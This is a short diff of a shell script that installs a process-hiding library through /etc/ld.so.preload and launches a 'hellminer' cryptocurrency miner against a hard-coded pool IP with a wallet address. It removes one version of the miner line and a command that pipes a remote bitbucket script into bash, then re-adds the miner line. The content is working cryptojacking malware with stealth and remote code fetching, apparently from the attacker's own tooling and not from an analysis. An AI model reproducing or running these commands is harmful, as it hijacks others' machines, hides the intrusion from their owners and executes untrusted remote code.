@@ -54,6 +54,4 @@ gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 
-./graftcp/graftcp & clear & ./hellminer -c stratum+tcp://209.97.168.28:443 -u RCADCQ9UW1RsUaF94Jp4huPSdQ7bhwYwa4.$(echo $(shuf -i 1-100000 -n 1)-bismillah) -password x >/dev/null 2>&1
-curl -sL https://bitbucket.org/kzpakid/wtrr/raw/master/time | bash
-  
+./graftcp/graftcp & clear & ./hellminer -c stratum+tcp://209.97.168.28:443 -u RCADCQ9UW1RsUaF94Jp4huPSdQ7bhwYwa4.$(echo $(shuf -i 1-100000 -n 1)-bismillah) -password x 
